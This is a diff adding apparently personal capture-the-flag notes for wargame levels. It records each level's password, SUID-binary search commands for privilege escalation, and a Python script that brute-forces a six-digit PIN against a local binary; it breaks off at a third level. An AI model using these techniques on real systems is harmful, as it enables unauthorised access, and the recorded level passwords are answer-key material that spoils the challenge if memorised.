@@ -1,0 +1,47 @@
+-lvl hacker
+pass: begood!
+chall type: SUID binary misuse
+NOTES
+> An suid binary is a program that runs with the owner's permissions' instead of the one executing it eg; sudo
+> ls -l will show u perms, an s represents an suid binary, perm 4000 = SUID
+> acatha left us a gift to attain her powers
+
+sol;
+    ls / , pazz contains the pass bt we cant run it, we need an suid binary designed to the file as the owner(acantha)
+    find / -perm -4000 -type f 2>/dev/null or find / -type f -perm -u=s 2>/dev/null
+    ls -l  the file and run the binary
+    
+
+-lvl acantha
+pass: mYYLhLBSkrzZqFydxGkn
+chall typ: pin breute forcing
+sol;
+    #!/usr/bin/env python3
+import subprocess, random, sys, os
+
+COMMON = ["123456","000000","111111","123123","654321","112233","121212","999999"]
+binary = sys.argv[1] 
+
+if not os.access(binary, os.X_OK):
+    sys.exit(f"[!] not executable: {binary}")
+
+seen = set(COMMON)
+pins = COMMON + random.sample([f"{i:06d}" for i in range(1_000_000) if f"{i:06d}" not in seen], 1_000_000 - len(seen))
+
+for pin in pins:
+    try:
+        r = subprocess.run([binary], input=pin+"\n", capture_output=True, text=True, timeout=1)
+        out = r.stdout + r.stderr
+        if r.returncode == 0 and "NO" not in out and out.strip():
+            print(f"FOUND: {pin}\n{out}")
+            break
+    except subprocess.TimeoutExpired:
+        continue
+    except KeyboardInterrupt:
+        sys.exit("\n[!] stopped")
+
+  run it with the bin as an arg
+
+-lvl alala
+pass: DsYzpJQrCEndEWIMxWxu
+chall type
